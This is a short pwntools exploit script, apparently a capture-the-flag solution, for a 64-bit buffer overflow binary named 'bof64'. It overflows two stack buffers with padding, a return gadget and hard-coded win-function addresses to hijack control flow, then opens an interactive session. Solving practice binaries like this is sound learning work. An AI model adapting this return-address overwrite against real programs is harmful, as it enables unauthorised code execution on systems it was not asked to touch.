#!/usr/bin/env python3.8

from pwn import *
import warnings
import re

# Allows you to switch between local/GDB/remote from terminal
def connect():
    if args.GDB:
        r = gdb.debug(elf.path, gdbscript=gdbscript)
    elif args.REMOTE:
        r = remote("localhost", 6948)
    else:
        r = process([elf.path])
    return r

# Specify GDB script here (breakpoints etc)
gdbscript = """
    set follow-fork-mode child
    start
    b *main+55
    b *win1+153
"""

# Binary filename
exe = './bof64'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# =======================
# EXPLOIT AFTER THIS
# =======================
r = connect()

offset_main = 120
offset_win1 = 40
WIN1 = 0x40124c
WIN2 = 0x4011f6
RET = 0x40133b

print(r.recvuntil("...\n").decode())
payload_1 = b"A" * offset_main
payload_1 += p64(RET) + p64(WIN1)
r.sendline(payload_1)

print(r.recvuntil("...\n").decode())
payload_2 = b"B" * offset_win1
payload_2 += p64(RET) + p64(WIN2)
r.sendline(payload_2)

r.interactive()